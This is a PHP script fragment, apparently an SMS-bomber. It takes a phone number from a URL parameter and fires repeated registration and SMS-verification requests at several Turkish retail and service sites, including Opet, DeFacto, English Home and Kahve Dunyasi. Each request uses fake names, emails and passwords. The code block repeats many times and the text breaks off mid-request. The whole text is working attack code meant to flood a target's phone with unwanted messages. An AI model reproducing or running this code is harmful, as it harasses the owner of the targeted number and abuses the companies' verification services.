	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
